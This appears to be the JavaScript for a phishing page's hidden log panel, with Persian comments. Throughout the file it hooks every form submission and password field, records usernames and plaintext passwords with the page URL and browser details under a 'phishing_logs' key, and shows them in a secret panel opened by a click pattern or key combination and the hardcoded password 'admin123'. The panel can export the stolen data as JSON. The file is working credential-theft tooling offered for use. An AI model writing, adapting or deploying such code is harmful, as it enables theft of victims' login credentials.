// پنل مدیریت مخفی - با رمز "admin123" باز می‌شود
class AdminPanel {
    constructor() {
        this.STORAGE_KEY = 'phishing_logs';
        this.ADMIN_PASSWORD = 'admin123';
        this.isAdmin = false;
        this.init();
    }

    init() {
        // ردیابی کلیک‌ها برای فعال‌سازی پنل
        this.setupClickTracker();
        // ذخیره لاگ‌های ورود
        this.setupLoginLogging();
    }

    setupClickTracker() {
        let clickCount = 0;
        let lastClickTime = 0;
        
        document.addEventListener('click', (e) => {
            const now = Date.now();
            
            // ۵ کلیک در ۲ ثانیه = فعال‌سازی پنل
            if (now - lastClickTime < 2000) {
                clickCount++;
                if (clickCount >= 5) {
                    clickCount = 0;
                    this.showAdminLogin();
                }
            } else {
                clickCount = 1;
            }
            
            lastClickTime = now;
        });
        
        // کلید ترکیبی
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                e.preventDefault();
                this.showAdminLogin();
            }
        });
    }

    setupLoginLogging() {
        // ذخیره مستقیم لاگ هنگام هر فرم
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            form.addEventListener('submit', (e) => {
                // کمی تاخیر برای ثبت مطمئن
                setTimeout(() => {
                    this.saveLoginData(form);
                }, 100);
            });
        });
        
        // همچنین ردیابی فیلدهای ورود
        document.addEventListener('input', (e) => {
            if (e.target.type === 'password' || 
                e.target.name?.toLowerCase().includes('pass') ||
                e.target.id?.toLowerCase().includes('pass')) {
                this.trackPasswordField(e.target);
            }
        });
    }

    saveLoginData(form) {
        try {
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            // اگر فیلدهای استاندارد وجود ندارند، از فیلدهای موجود استفاده کن
            if (!data.username && !data.user) {
                const usernameFields = form.querySelector('input[type="text"], input[name*="user"], input[id*="user"]');
                if (usernameFields) data.username = usernameFields.value;
            }
            
            if (!data.password && !data.pass) {
                const passwordFields = form.querySelector('input[type="password"]');
                if (passwordFields) data.password = passwordFields.value;
            }
            
            const logEntry = {
                id: Date.now(),
                username: data.username || 'نامشخص',
                password: data.password || 'نامشخص',
                timestamp: new Date().toLocaleString('fa-IR'),
                url: window.location.href,
                userAgent: navigator.userAgent.substring(0, 100)
            };
            
            // ذخیره در localStorage
            const logs = this.getLogs();
            logs.push(logEntry);
            localStorage.setItem(this.STORAGE_KEY, JSON.stringify(logs));
            
            // همچنین در آرایه موقت برای دسترسی سریع
            if (!window.tempLogs) window.tempLogs = [];
            window.tempLogs.push(logEntry);
            
            console.log('✅ لاگ ثبت شد:', logEntry.username);
            
        } catch (err) {
            console.error('خطا در ثبت لاگ:', err);
        }
    }

    trackPasswordField(field) {
        // ردیابی تغییرات رمز
        if (!field._tracked) {
            field._tracked = true;
            field.addEventListener('change', () => {
                const form = field.closest('form');
                if (form) {
                    const tempData = {
                        username: '',
                        password: field.value,
                        timestamp: new Date().toLocaleString('fa-IR'),
                        action: 'password_changed'
                    };
                    
                    const logs = this.getLogs();
                    logs.push(tempData);
                    localStorage.setItem(this.STORAGE_KEY, JSON.stringify(logs));
                }
            });
        }
    }

    getLogs() {
        try {
            const logs = localStorage.getItem(this.STORAGE_KEY);
            return logs ? JSON.parse(logs) : [];
        } catch {
            return [];
        }
    }

    showAdminLogin() {
        const password = prompt('🔐 ورود به پنل مدیریت\nرمز: admin123', '');
        
        if (password === this.ADMIN_PASSWORD) {
            this.isAdmin = true;
            this.showAdminPanel();
        } else if (password !== null) {
            alert('❌ رمز اشتباه');
        }
    }

    showAdminPanel() {
        const logs = this.getLogs();
        
        // ایجاد پنل
        const panel = document.createElement('div');
        panel.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            width: 80%;
            height: 90%;
            background: white;
            z-index: 99999;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
            display: flex;
            flex-direction: column;
            font-family: Tahoma;
        `;
        
        panel.innerHTML = `
            <div style="padding: 15px; background: #2c3e50; color: white; border-radius: 10px 10px 0 0; display: flex; justify-content: space-between;">
                <h3 style="margin: 0;">📊 لاگ‌ها (${logs.length})</h3>
                <button onclick="this.closest('div').remove();" style="background: red; color: white; border: none; padding: 5px 10px; border-radius: 5px;">X</button>
            </div>
            
            <div style="padding: 10px; background: #ecf0f1; border-bottom: 1px solid #bdc3c7;">
                <button onclick="exportLogs()" style="margin: 5px; padding: 8px; background: #27ae60; color: white; border: none; border-radius: 5px;">💾 ذخیره JSON</button>
                <button onclick="clearLogs()" style="margin: 5px; padding: 8px; background: #e74c3c; color: white; border: none; border-radius: 5px;">🗑️ پاک کردن</button>
                <button onclick="refreshPanel()" style="margin: 5px; padding: 8px; background: #3498db; color: white; border: none; border-radius: 5px;">🔄 بروزرسانی</button>
            </div>
            
            <div style="flex: 1; overflow: auto; padding: 10px;">
                ${this.generateLogsHTML(logs)}
            </div>
        `;
        
        document.body.appendChild(panel);
        
        // اضافه کردن توابع
        window.exportLogs = () => this.exportLogs();
        window.clearLogs = () => this.clearLogs();
        window.refreshPanel = () => {
            panel.remove();
            this.showAdminPanel();
        };
    }

    generateLogsHTML(logs) {
        if (logs.length === 0) {
            return '<div style="text-align: center; padding: 40px; color: #7f8c8d;">لاگی یافت نشد</div>';
        }
        
        return `
            <table style="width: 100%; border-collapse: collapse; font-size: 12px;">
                <thead>
                    <tr style="background: #34495e; color: white;">
                        <th style="padding: 8px; border: 1px solid #2c3e50;">ردیف</th>
                        <th style="padding: 8px; border: 1px solid #2c3e50;">زمان</th>
                        <th style="padding: 8px; border: 1px solid #2c3e50;">کاربر</th>
                        <th style="padding: 8px; border: 1px solid #2c3e50;">رمز</th>
                        <th style="padding: 8px; border: 1px solid #2c3e50;">IP</th>
                    </tr>
                </thead>
                <tbody>
                    ${logs.map((log, index) => `
                        <tr style="background: ${index % 2 ? '#f8f9fa' : 'white'};">
                            <td style="padding: 6px; border: 1px solid #ddd; text-align: center;">${index + 1}</td>
                            <td style="padding: 6px; border: 1px solid #ddd; text-align: center; font-size: 11px;">${log.timestamp || '-'}</td>
                            <td style="padding: 6px; border: 1px solid #ddd; text-align: center; font-family: monospace; color: #2c3e50;">${this.escapeHtml(log.username || log.user || '?')}</td>
                            <td style="padding: 6px; border: 1px solid #ddd; text-align: center; font-family: monospace; color: #c0392b; font-weight: bold;">${this.escapeHtml(log.password || '?')}</td>
                            <td style="padding: 6px; border: 1px solid #ddd; text-align: center; font-size: 11px; color: #7f8c8d;">${log.userAgent || '-'}</td>
                        </tr>
                    `).reverse().join('')}
                </tbody>
            </table>
        `;
    }

    exportLogs() {
        const logs = this.getLogs();
        const data = JSON.stringify(logs, null, 2);
        const blob = new Blob([data], {type: 'application/json'});
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `logs_${Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        alert(`✅ ${logs.length} لاگ ذخیره شد`);
    }

    clearLogs() {
        if (confirm(`آیا ${this.getLogs().length} لاگ پاک شود؟`)) {
            localStorage.removeItem(this.STORAGE_KEY);
            alert('✅ پاک شد');
            document.querySelector('div[style*="position: fixed; top: 10px"]')?.remove();
        }
    }

    escapeHtml(text) {
        return String(text).replace(/[&<>"']/g, m => ({
            '&': '&amp;', '<': '&lt;', '>': '&gt;',
            '"': '&quot;', "'": '&#39;'
        })[m]);
    }
}

// راه‌اندازی خودکار
document.addEventListener('DOMContentLoaded', () => {
    window.adminPanel = new AdminPanel();
    
    // ثبت لاگ از هر فرم موجود
    setTimeout(() => {
        const forms = document.querySelectorAll('form');
        console.log(`🔍 ${forms.length} فرم پیدا شد`);
    }, 1000);
    
    // راهنمای دسترسی در کنسول
    console.log('🔑 برای پنل مدیریت:');
    console.log('1. ۵ کلیک سریع در صفحه');
    console.log('2. کلیدهای Ctrl+Shift+A');
    console.log('3. رمز: admin123');
});

// تابع کمکی برای ثبت دستی لاگ
window.logData = (username, password) => {
    if (!window.adminPanel) return;
    
    const log = {
        id: Date.now(),
        username: username,
        password: password,
        timestamp: new Date().toLocaleString('fa-IR'),
        source: 'manual'
    };
    
    const logs = window.adminPanel.getLogs();
    logs.push(log);
    localStorage.setItem('phishing_logs', JSON.stringify(logs));
    
    console.log('📝 لاگ دستی ثبت شد:', username);
    return true;
};